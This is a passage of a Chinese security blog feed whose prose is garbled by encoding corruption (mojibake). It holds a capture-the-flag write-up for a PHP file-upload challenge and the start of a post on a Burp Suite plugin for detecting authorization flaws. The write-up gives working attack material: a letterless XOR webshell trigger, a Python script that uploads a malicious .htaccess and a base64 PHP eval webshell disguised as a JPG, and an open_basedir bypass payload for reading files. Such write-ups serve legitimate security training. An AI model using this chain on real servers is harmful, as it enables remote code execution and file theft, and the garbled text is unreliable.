&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\&#123;<span class="subst">$l</span>`<span class="subst">$r</span>\&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>è§£é¢˜æ€è·¯ï¼š<br>é€šè¿‡å®¡è®¡ï¼Œgetshellå¯ä»¥åˆ†ä¸ºä¸¤ä¸ªæ­¥éª¤ï¼Œç¬¬ä¸€æ­¥ï¼Œå…ˆç»•è¿‡æ¡ä»¶ if ( preg_match(â€˜&#x2F;[\x00- 0-9A-Za-z&#39;â€œ\åå¼•å·~_&amp;.,|&#x3D;[\x7F]+&#x2F;iâ€™, $hhh) ) ï¼Œè¿™ä¸ªæ¡ä»¶é€šè¿‡ å¼‚æˆ–çš„æ–¹å¼æ„é€ æ— å­—æ¯webshellç»•è¿‡ã€‚ç¬¬äºŒæ­¥ï¼šéœ€è¦ç»•è¿‡ä¸‰ä¸ªæ¡ä»¶ï¼Œåˆ†åˆ«æ˜¯ if(preg_match(â€œ&#x2F;ph&#x2F;iâ€,$extension))ï¼Œåç¼€ä¸èƒ½å¸¦æœ‰phã€‚if(mb_strpos(file_get_contents($tmp_name), â€˜&lt;?â€™)!&#x3D;&#x3D;False)ï¼Œæ–‡ä»¶å†…å®¹ä¸­ä¸èƒ½å­˜åœ¨ &lt;?ã€‚if(!exif_imagetype($tmp_name)) ï¼Œæ–‡ä»¶å¤´å¿…é¡»æ˜¯å¸¸è§å›¾ç‰‡ç±»å‹æ–‡ä»¶å¤´ã€‚ç»•è¿‡æ–¹å¼ï¼šé€šè¿‡ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œåœ¨.htaccessæ–‡ä»¶ä¸­ï¼Œéœ€è¦ä¼ªé€ å›¾ç‰‡å¤´æ¥è¿‡ç¬¬ä¸‰ä¸ªæ¡ä»¶çš„æ£€æµ‹ ï¼Œé€šå¸¸æˆ‘ä»¬ä¼šæƒ³åˆ°GIF89aæ¥ç»•è¿‡ï¼Œä½†æ˜¯è¿™æ ·ä¼šè®©.htaccessæ–‡ä»¶ä¸èƒ½ç”Ÿæ•ˆï¼Œè¿™æ—¶å¯ä»¥é€šè¿‡ åœ¨.htaccess å¤´éƒ¨æ·»åŠ #define width 1337 #define height 1337 ç»•è¿‡ã€‚ç„¶åå†ä¸Šä¼ å¤´éƒ¨å¸¦æœ‰GIF89aã€åç¼€åä¸ºjpgçš„ä¸€å¥è¯ã€‚</p><p>ç¬¬ä¸€æ­¥ï¼šé€šè¿‡å¼‚æˆ–æ„é€ æ— å­—æ¯webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// $&#123;_GET&#125;&#123;_&#125;(); </span><br><span class="line">// é€šè¿‡ä¸Šé¢ç»™çš„è„šæœ¬ åˆ†åˆ«ç”¨ _ G E T æ¥ä½œä¸ºå¼‚æˆ–ç›®æ ‡</span><br><span class="line">// å¾—åˆ°</span><br><span class="line">_:%FF^%A0</span><br><span class="line">T:%FF^%AB</span><br><span class="line">G:%FF^%B8</span><br><span class="line">E:%FF^%BA</span><br><span class="line">// ç»„è£…</span><br><span class="line">$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%A0&#125;();</span><br><span class="line">// phpinfo æµ‹è¯•</span><br><span class="line">$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%A0&#125;();&amp;%A0=phpinfo</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥ï¼šå†è¿›è¡Œ.htaccess æ–‡ä»¶å†…å®¹æ„å»ºçš„æ—¶å€™ï¼Œéœ€è¦çŸ¥é“æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„ï¼Œè·¯å¾„çš„æ„å»ºè§„åˆ™,<code>upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])</code>ï¼Œå¾—åˆ° <code>upload/tmp_532fb014387262fa08e25fd65663cac2</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .jpg</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_532fb014387262fa08e25fd65663cac2/shell.jpg&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># è¿™é‡ŒGIF89aåé¢é‚£ä¸ª12æ˜¯ä¸ºäº†è¡¥è¶³8ä¸ªå­—èŠ‚ï¼Œæ»¡è¶³base64ç¼–ç çš„è§„åˆ™</span></span><br><span class="line">shell = <span class="string">&quot;GIF89a&quot;</span>+<span class="string">&quot;aa&quot;</span>+<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&quot;</span></span><br><span class="line"><span class="comment"># &lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://3cd358ce-4a9b-430d-b949-13b4c50642f0.node4.buuoj.cn:81/?_=$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%A0&#125;();&amp;%A0=get_the_flag&#x27;</span></span><br><span class="line"><span class="comment"># print(url)</span></span><br><span class="line"><span class="comment"># ä¸Šä¼  .htaccess </span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>, htaccess, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">&#x27;upload&#x27;</span>:<span class="string">&#x27;submit&#x27;</span>&#125;</span><br><span class="line">res = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="comment"># ä¸Šä¼ shell</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.jpg&#x27;</span>, shell, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">&#x27;upload&#x27;</span>:<span class="string">&#x27;submit&#x27;</span>&#125;</span><br><span class="line">res = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>ä¹‹åç”¨èšå‰‘è¿æ¥ï¼š<br><img src="/2024/10/25/WebSecurity/ctf/buuctf/image-3.png"><br>ä½†æ˜¯ä¸èƒ½è·³è½¬åˆ°å…¶ä»–ç›®å½•ï¼Œä½¿ç”¨èšå‰‘çš„disable_functionsæ’ä»¶ï¼Œè¾…åŠ©å·¥å…·-&gt;ç»•è¿‡disable_functions-&gt;é€‰æ‹©æ¨¡å¼-&gt;PHP7_GC_UAF ã€‚<br>æ‰‹åŠ¨ç»•è¿‡open_basedir payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url: http://3cd358ce-4a9b-430d-b949-13b4c50642f0.node4.buuoj.cn:81/upload/tmp_532fb014387262fa08e25fd65663cac2/shell.jpg</span><br><span class="line">POST</span><br><span class="line">cmd=chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);print_r(file_get_contents(&#x27;/THis_Is_tHe_F14g&#x27;));</span><br></pre></td></tr></table></figure><p><code>open_basedir</code> æ˜¯ PHP ä¸­çš„ä¸€ä¸ªé…ç½®æŒ‡ä»¤ï¼Œç”¨äºé™åˆ¶ PHP è„šæœ¬åªèƒ½è®¿é—®æŒ‡å®šç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„æ–‡ä»¶ã€‚è®¾ç½® <code>open_basedir</code> çš„ç›®çš„æ˜¯é˜²æ­¢ PHP è„šæœ¬è®¿é—®ç³»ç»Ÿä¸­ä¸å¿…è¦çš„æ–‡ä»¶å’Œç›®å½•ï¼Œä»è€ŒåŠ å¼ºæœåŠ¡å™¨çš„å®‰å…¨æ€§ã€‚</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">open_basedir</span> = <span class="string">&quot;/var/www/html:/tmp&quot;</span></span><br></pre></td></tr></table></figure><p>è¿™æ„å‘³ç€æ‰€æœ‰ PHP è„šæœ¬åªèƒ½è®¿é—® <code>/var/www/html</code> å’Œ <code>/tmp</code> ç›®å½•ä»¥åŠå®ƒä»¬çš„å­ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œè¯•å›¾è®¿é—®å…¶ä»–ç›®å½•ä¼šå¯¼è‡´é”™è¯¯æç¤ºï¼ˆé€šå¸¸æ˜¯ â€œopen_basedir restriction in effectâ€ï¼‰ã€‚</p><p><strong>ç»•è¿‡ <code>open_basedir</code> çš„å¸¸è§æ–¹æ³•</strong><br>å°½ç®¡ <code>open_basedir</code> æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„å®‰å…¨æ§åˆ¶æ‰‹æ®µï¼Œä½†åœ¨æŸäº›ç‰¹å®šé…ç½®å’Œæ¼æ´æƒ…å†µä¸‹å¯èƒ½ä¼šè¢«ç»•è¿‡ã€‚ä»¥ä¸‹æ˜¯å‡ ç§å¸¸è§çš„ç»•è¿‡æ–¹å¼ï¼š</p><ol><li><strong>ç¬¦å·é“¾æ¥ï¼ˆSymlinkï¼‰æ”»å‡»</strong>ï¼šæœ‰æ—¶å¯ä»¥é€šè¿‡ç¬¦å·é“¾æ¥å°†å…è®¸è®¿é—®çš„ç›®å½•é“¾æ¥åˆ°å—é™åˆ¶çš„ç›®å½•ï¼Œä»è€Œé—´æ¥è®¿é—®è¢«é™åˆ¶çš„ç›®å½•ã€‚</li><li><strong>æ–‡ä»¶åè®®æ¼æ´</strong>ï¼šåˆ©ç”¨æŸäº›æ‰©å±•æˆ–å‡½æ•°ï¼Œå¦‚ <code>curl</code> çš„ <code>file://</code> åè®®ã€<code>ZIP</code> æ‰©å±•ã€å›¾ç‰‡å¤„ç†åº“ç­‰ï¼Œæœ‰æ—¶å¯ä»¥ç»•è¿‡ <code>open_basedir</code> é™åˆ¶ã€‚</li><li><strong>åŒ…å«æ¼æ´</strong>ï¼šæŸäº› PHP æ‰©å±•æˆ–å‡½æ•°åœ¨å¤„ç†æ–‡ä»¶åŒ…å«æ—¶å­˜åœ¨æ¼æ´ï¼Œå¯èƒ½ä¼šæ„å¤–å…è®¸è®¿é—®å—é™è·¯å¾„ã€‚ä¾‹å¦‚ï¼Œåˆ©ç”¨æ–‡ä»¶åŒ…è£…å™¨ï¼ˆfile wrappersï¼‰å°è¯•è®¿é—®ç‰¹å®šæ–‡ä»¶ã€‚</li><li><strong>PHP æ‰©å±•çš„æ–‡ä»¶è¯»å†™ç‰¹æ€§</strong>ï¼šæŸäº› PHP æ‰©å±•ï¼ˆå¦‚ <code>FFmpeg</code>ã€<code>ImageMagick</code>ã€<code>iconv</code>ï¼‰å¯èƒ½å…è®¸é€šè¿‡éç›´æ¥æ–‡ä»¶æ“ä½œè¯»å–å—é™ç›®å½•å†…å®¹ã€‚</li><li><strong>è·¯å¾„è§£æé—®é¢˜</strong>ï¼šåˆ©ç”¨ä¸€äº›ç‰¹æ®Šè·¯å¾„ï¼Œå¦‚ <code>/proc/self/cwd</code> æˆ– <code>..</code> ç­‰ï¼Œå°è¯•è§£æåˆ°å—é™åˆ¶çš„ç›®å½•ï¼ˆåœ¨æŸäº›ç³»ç»Ÿä¸Šå¯èƒ½æœ‰æ•ˆï¼‰ã€‚</li></ol><p>ä¸Šé¢çš„payloadå«ä¹‰ä½œç”¨å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;img&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/THis_Is_tHe_F14g&#x27;</span>));</span><br></pre></td></tr></table></figure><ol><li><strong>åˆ‡æ¢ç›®å½•åˆ°å¯è®¿é—®è·¯å¾„</strong>ï¼š<ul><li><code>chdir(&#39;img&#39;)</code>ï¼šå°†å½“å‰ç›®å½•åˆ‡æ¢åˆ° <code>img</code> ç›®å½•ï¼Œè¿™é€šå¸¸æ˜¯ä¸€ä¸ªå¯ä»¥è®¿é—®çš„å­ç›®å½•ã€‚</li></ul></li><li>**é‡ç½® <code>open_basedir</code>**ï¼š<ul><li><code>ini_set(&#39;open_basedir&#39;, &#39;..&#39;)</code>ï¼šé€šè¿‡ <code>ini_set</code> å°† <code>open_basedir</code> çš„èŒƒå›´é‡æ–°å®šä¹‰ä¸ºä¸Šä¸€çº§ç›®å½•ï¼ˆ<code>..</code>ï¼‰ï¼Œå…è®¸è„šæœ¬è®¿é—®å½“å‰ç›®å½•çš„çˆ¶ç›®å½•ã€‚</li></ul></li><li><strong>å¤šæ¬¡åˆ‡æ¢åˆ°ä¸Šçº§ç›®å½•</strong>ï¼š<ul><li><code>chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);</code>ï¼šé‡å¤ä½¿ç”¨ <code>chdir(&#39;..&#39;)</code> æŒ‡ä»¤è¿”å›åˆ°æ›´é«˜çš„ç›®å½•çº§åˆ«ï¼Œæœ€ç»ˆåˆ°è¾¾æ ¹ç›®å½•ï¼ˆ<code>/</code>ï¼‰ã€‚</li></ul></li><li><strong>é‡è®¾ <code>open_basedir</code> åˆ°æ ¹ç›®å½•</strong>ï¼š<ul><li><code>ini_set(&#39;open_basedir&#39;, &#39;/&#39;)</code>ï¼šå†æ¬¡ä½¿ç”¨ <code>ini_set</code> å°† <code>open_basedir</code> è®¾ç½®ä¸ºæ ¹ç›®å½• <code>/</code>ï¼Œå³å…è®¸è®¿é—®æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿã€‚</li></ul></li><li><strong>è¯»å–æ•æ„Ÿæ–‡ä»¶</strong>ï¼š<ul><li><code>print_r(file_get_contents(&#39;/THis_Is_tHe_F14g&#39;));</code>ï¼šåˆ©ç”¨ <code>file_get_contents</code> è¯»å– <code>/THis_Is_tHe_F14g</code> æ–‡ä»¶çš„å†…å®¹ï¼ˆå‡è®¾è¿™æ˜¯ç›®æ ‡æ–‡ä»¶ï¼‰ï¼Œå¹¶è¾“å‡ºåˆ°å“åº”ä¸­ã€‚</li></ul></li></ol><p>è¿™ç§ç»•è¿‡æ–¹å¼åˆ©ç”¨äº† PHP çš„åŠ¨æ€é…ç½®ç‰¹æ€§ï¼Œå¦‚æœ <code>ini_set</code> å‡½æ•°å¯ç”¨ä¸” <code>open_basedir</code> ä¸ä¸¥æ ¼è®¾ç½®ä¸ºä¸å¯æ›´æ”¹ï¼Œé‚£ä¹ˆè„šæœ¬æœ‰å¯èƒ½é€šè¿‡è¿™ç§æ–¹å¼è®¿é—®æ•æ„Ÿæ–‡ä»¶ã€‚<br>ä¸ºé˜²æ­¢æ­¤ç±»ç»•è¿‡ï¼Œå¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š</p><ul><li><strong>ç¦ç”¨ <code>ini_set</code> å‡½æ•°</strong>ï¼šé˜²æ­¢è¿è¡Œæ—¶æ›´æ”¹ <code>open_basedir</code> é…ç½®ã€‚</li><li>**ä¸¥æ ¼è®¾ç½® <code>open_basedir</code>**ï¼šåœ¨æœåŠ¡å™¨é…ç½®ä¸­å¼ºåˆ¶è®¾ç½® <code>open_basedir</code>ï¼Œé¿å…è„šæœ¬é€šè¿‡ä»£ç æ›´æ”¹é…ç½®ã€‚</li><li><strong>ä½¿ç”¨å®¹å™¨åŒ–éš”ç¦»</strong>ï¼šåœ¨ä¸¥æ ¼éš”ç¦»çš„ç¯å¢ƒä¸­è¿è¡ŒæœåŠ¡ï¼Œé˜²æ­¢çªç ´é™åˆ¶åç›´æ¥è®¿é—®ä¸»æœºç³»ç»Ÿä¸­çš„æ•æ„Ÿæ–‡ä»¶ã€‚</li></ul><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>ç”¨æ— å­—æ¯webshellçš„æ–¹å¼ç»•è¿‡æ­£åˆ™å¯¹å­—æ¯æ•°å­—çš„åŒ¹é…ï¼Œé€šè¿‡ä¸Šä¼ .htaccessçš„æ–¹å¼ç»•è¿‡å¯¹æ­£åˆ™å¯¹åç¼€çš„åŒ¹é…ï¼Œ.htaccessä¸ºä»€ä¹ˆä¸Šä¼ è¿™ä¸ªæ–‡ä»¶å°±èƒ½è®©ä¸Šä¼ çš„å›¾ç‰‡å½“åšphpæ–‡ä»¶æ‰§è¡Œå‘¢ï¼Ÿ<br><img src="/2024/10/25/WebSecurity/ctf/buuctf/image-4.png"><br>å®é™…ä¸Šå°±æ˜¯apacheçš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯åªæœ‰æœåŠ¡å™¨æ˜¯apacheçš„æ—¶å€™å¯ä»¥è¿™æ ·åšï¼Œnginxå°±ä¸è¡Œã€‚è€Œ AddType è¿™ä¸ªå‚æ•°å¯ä»¥ä¸ºå½“å‰ç›®å½•ä¸‹çš„ æŒ‡å®šçš„åç¼€åæ·»åŠ MIMEç±»å‹ã€‚<br>åˆšåˆšæˆ‘ä»¬è®¾ç½®çš„ AddType application&#x2F;x-httpd-php .jpg å°±æ˜¯æŠŠ.jpgåç¼€çš„MIMEç±»å‹è®¾ç½®ä¸º application&#x2F;x-httpd-phpï¼ŒæœåŠ¡å™¨å»è¯»å–.jpgæ–‡ä»¶çš„æ—¶å€™ä¼šæŠŠå®ƒå½“æˆphpæ–‡ä»¶è¯»å–ï¼Œæ‰€ä»¥ï¼Œé‡Œé¢çš„ä¸€å¥è¯å°±èƒ½æ‰§è¡Œã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å·¥å…·å¼€å‘ã€‘Burpsuite æ’ä»¶å¼€å‘</title>
      <link href="/2024/10/24/tools/aiassist/"/>
      <url>/2024/10/24/tools/aiassist/</url>
      
        <content type="html"><![CDATA[<p><a href="https://mp.weixin.qq.com/s/ypCkaJ51kcJBQ1cskDuCsA">https://mp.weixin.qq.com/s/ypCkaJ51kcJBQ1cskDuCsA</a></p><h2 id="æƒ³æ³•"><a href="#æƒ³æ³•" class="headerlink" title="æƒ³æ³•"></a>æƒ³æ³•</h2><p>å‡ºå‘ç‚¹æ˜¯åœ¨æœ‰å¾ˆå¤šçš„é€»è¾‘æ¼æ´éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨å»æµ‹è¯•ï¼Œæ¯”å¦‚è¶Šæƒæ¼æ´ï¼Œéœ€è¦æˆ‘ä»¬ä¿®æ”¹å‚æ•°å¹¶é‡æ”¾ï¼Œå¯¹æ¯”è¿”å›æ•°æ®åŒ…çš„å·®å¼‚ï¼Œè¿™äº›ç®€å•é‡å¤çš„å·¥ä½œå®Œå…¨å¯ä»¥è‡ªåŠ¨åŒ–å®Œæˆã€‚é™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥è‡ªåŠ¨åŒ–å®ç°çš„æ¼æ´åŒ…æ‹¬ï¼š</p><ul><li>ä¿¡æ¯æ³„æ¼ï¼šæ•æ„Ÿä¿¡æ¯æ•°æ®å¯ä»¥åˆ©ç”¨aiè¯†åˆ«</li><li>éªŒè¯ç å›æ˜¾æ¼æ´ï¼šåœ¨æŸäº›ç™»é™†æˆ–éœ€è¦éªŒè¯çš„åœºæ™¯ä¸‹ï¼Œåç«¯ä¼šå°†éªŒè¯ç è¿”å›åˆ°å‰ç«¯ï¼Œå‰ç«¯è¾“å…¥ä»»æ„è´¦å·å³å¯å®ç°ç™»é™†æˆ–å…¶å®ƒæ•æ„Ÿæ“ä½œ</li><li>å®‰å…¨æœºåˆ¶ç»•è¿‡æ¼æ´ï¼šå¸¸è§äºè¿”å›åŒ…ä¸­ï¼Œè¿”å›åŒ…ä¿®æ”¹ä¸ºï¼š200åï¼Œå³å¯ç»•è¿‡åç«¯çš„ç™»é™†å¤±è´¥ç­‰é—®é¢˜</li><li>ä»»æ„ç”¨æˆ·ä¼ªé€ ï¼šéœ€è¦å¤šä¸ªæ•°æ®åŒ…ååŒï¼Œä¸€ä¸ªæ•°æ®åŒ…ä¿®æ”¹è¯·æ±‚å¸¦æœ‰ç”¨æˆ·åï¼Œå¦‚æœå¯ä»¥ç›´æ¥è·å–åˆ°è¿”å›çš„cookieå°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªcookieè®¿é—®å…¶ä»–çš„é¡µé¢</li></ul><h2 id="è‡ªåŠ¨åŒ–è¶Šæƒæ¼æ´åˆ¤æ–­"><a href="#è‡ªåŠ¨åŒ–è¶Šæƒæ¼æ´åˆ¤æ–­" class="headerlink" title="è‡ªåŠ¨åŒ–è¶Šæƒæ¼æ´åˆ¤æ–­"></a>è‡ªåŠ¨åŒ–è¶Šæƒæ¼æ´åˆ¤æ–­</h2><p><a href="https://cloud.tencent.com/developer/article/2235686">https://cloud.tencent.com/developer/article/2235686</a></p><p>ä»æ‰‹å·¥æµ‹è¯•è§’åº¦è§¦å‘ä¸»è¦æ˜¯æœ‰ä¸¤æ­¥</p><ol><li>ä¿®æ”¹è¯·æ±‚åŒ…<ul><li>éœ€è¦æ˜ç¡®è¯·æ±‚åŒ…å…·ä½“ä¿®æ”¹å“ªé‡Œï¼Œä¿®æ”¹çš„æ•°æ®ç±»å‹æ˜¯ä»€ä¹ˆ</li><li>è¯·æ±‚åŒ…æ˜¯å¦æœ‰é‰´æƒå­—æ®µï¼Œè¿™ä¸ªå­—æ®µå“ªé‡Œæ¥çš„</li></ul></li><li>åˆ¤æ–­è¿”å›åŒ…<ul><li>è¿”å›åŒ…ä¸èƒ½ä»…ä»…åˆ¤æ–­æ˜¯å¦ç›¸åŒï¼Œå› ä¸ºæ¯æ¬¡è¯·æ±‚å¯èƒ½ä¸ä¸€æ ·ï¼Œåº”å½“åˆ¤æ–­è¿”å›åŒ…çš„è¯¦ç»†åº¦ï¼Œæˆ–è€…å¯ä»¥é€šè¿‡å…³é”®userç›¸å…³ä¿¡æ¯åˆ¤æ–­</li></ul></li></ol><h3 id="ç°æœ‰å·¥å…·"><a href="#ç°æœ‰å·¥å…·" class="headerlink" title="ç°æœ‰å·¥å…·"></a>ç°æœ‰å·¥å…·</h3><p><a href="https://github.com/Quitten/Autorize">https://github.com/Quitten/Autorize</a><br><a href="https://github.com/sule01u/AutorizePro">https://github.com/sule01u/AutorizePro</a></p><ol><li><strong>å·¥å…·æ ‡å¿—å¿½ç•¥</strong>ï¼ˆ<code>tool_needs_to_be_ignored</code>ï¼‰ï¼š<ul><li>æ£€æŸ¥æ˜¯å¦åº”å¿½ç•¥æ¥è‡ªç‰¹å®šBurp Suiteå·¥å…·ï¼ˆå¦‚Spider, Proxy, Targetï¼‰çš„è¯·æ±‚ï¼ŒåŸºäºç”¨æˆ·é…ç½®ã€‚</li></ul></li><li><strong>æ•è·å’Œè®°å½•Cookieå’Œæˆæƒå¤´</strong>ï¼ˆ<code>capture_last_cookie_header</code>, <code>capture_last_authorization_header</code>ï¼‰ï¼š<ul><li>ä»HTTPè¯·æ±‚æˆ–å“åº”ä¸­æ•è·æœ€åä¸€æ¬¡ä½¿ç”¨çš„Cookieå’Œæˆæƒå¤´ï¼Œæ–¹ä¾¿åç»­è¯·æ±‚çš„å¤ç”¨ã€‚</li></ul></li><li><strong>304çŠ¶æ€ç é˜²å¾¡</strong>ï¼ˆ<code>handle_304_status_code_prevention</code>ï¼‰ï¼š<ul><li>ä¿®æ”¹è¯·æ±‚å¤´ä»¥é¿å…æœåŠ¡å™¨è¿”å›304çŠ¶æ€ç ï¼Œè¿™å¯èƒ½å½±å“å¯¹å“åº”å†…å®¹çš„æ£€æµ‹ã€‚</li></ul></li><li><strong>æ¶ˆæ¯è¿‡æ»¤</strong>ï¼ˆ<code>message_passed_interception_filters</code>ï¼‰ï¼š<ul><li>åº”ç”¨ä¸€ç³»åˆ—è‡ªå®šä¹‰è¿‡æ»¤è§„åˆ™ï¼Œç¡®å®šæ˜¯å¦åº”å¤„ç†ç‰¹å®šçš„HTTPè¯·æ±‚æˆ–å“åº”ã€‚è¿™åŒ…æ‹¬URLåŒ…å«&#x2F;ä¸åŒ…å«ç‰¹å®šæ–‡æœ¬æˆ–æ­£åˆ™è¡¨è¾¾å¼ã€è¯·æ±‚ä½“å’Œå“åº”ä½“çš„å†…å®¹æ£€æµ‹ç­‰ã€‚</li></ul></li><li><strong>è¶Šæƒæ£€æµ‹å’Œæˆæƒæ ¡éªŒ</strong>ï¼ˆ<code>handle_message</code>, <code>checkAuthorization</code>, <code>send_request_to_autorize</code>ï¼‰ï¼š<ul><li>ä¸»è¦é€»è¾‘å…¥å£ï¼Œå¤„ç†ä¼ å…¥çš„æ¶ˆæ¯ï¼Œåˆ¤æ–­æ˜¯å¦ç¬¦åˆå¤„ç†æ¡ä»¶ï¼Œç„¶åæ‰§è¡Œè¶Šæƒæ£€æµ‹ã€‚</li><li><code>send_request_to_autorize</code> æ˜¯åœ¨åŸå§‹è¯·æ±‚åŸºç¡€ä¸Šä¿®æ”¹åå‘é€çš„åŠŸèƒ½ï¼Œç”¨æ¥æ¨¡æ‹Ÿæœªæˆæƒæˆ–é‡æ–°æˆæƒçš„è¯·æ±‚ã€‚</li></ul></li><li><strong>è‡ªå®šä¹‰é€»è¾‘å¤„ç†å“åº”</strong>ï¼ˆ<code>auth_enforced_via_enforcement_detectors</code>, <code>is_json_response</code>, <code>checkBypass</code>ï¼‰ï¼š<ul><li>æ ¹æ®è®¾ç½®çš„æ£€æµ‹é€»è¾‘ï¼ˆçŠ¶æ€ç ã€å¤´éƒ¨ã€å“åº”ä½“ç­‰ï¼‰æ¥ç¡®å®šæ˜¯å¦å®æ–½äº†æˆæƒã€‚</li><li><code>checkBypass</code> æ–¹æ³•æ¯”è¾ƒæˆæƒå‰åçš„çŠ¶æ€ç å’Œå†…å®¹ï¼Œä»¥ç¡®å®šæ˜¯å¦å­˜åœ¨è¶Šæƒæˆ–æˆæƒç»•è¿‡ã€‚</li></ul></li></ol><p>è¶Šæƒæ¼æ´çš„æ£€æµ‹ä¾èµ–äºæ¯”è¾ƒä¿®æ”¹å‰åçš„è¯·æ±‚å“åº”ã€‚å¦‚æœä¿®æ”¹ç”¨æˆ·æˆæƒä¿¡æ¯ï¼ˆå¦‚Cookieæˆ–Authorization headerï¼‰åï¼Œå¾—åˆ°çš„å“åº”ä¸åŸå“åº”ç›¸ä¼¼ï¼Œè¯´æ˜ç³»ç»Ÿæœªèƒ½æ­£ç¡®å®æ–½è®¿é—®æ§åˆ¶ï¼Œä»è€Œå­˜åœ¨è¶Šæƒé—®é¢˜ã€‚</p><h3 id="æ¨¡å—è®¾è®¡"><a href="#æ¨¡å—è®¾è®¡" class="headerlink" title="æ¨¡å—è®¾è®¡"></a>æ¨¡å—è®¾è®¡</h3><p>è®¾è®¡ä¸€ä¸ªBurp Suiteæ’ä»¶ä»¥ä½¿ç”¨AIè¿›è¡Œè¶Šæƒæ£€æµ‹å¹¶é¢„ç•™æ‰©å±•æ€§ç”¨äºæœªæ¥å¢åŠ 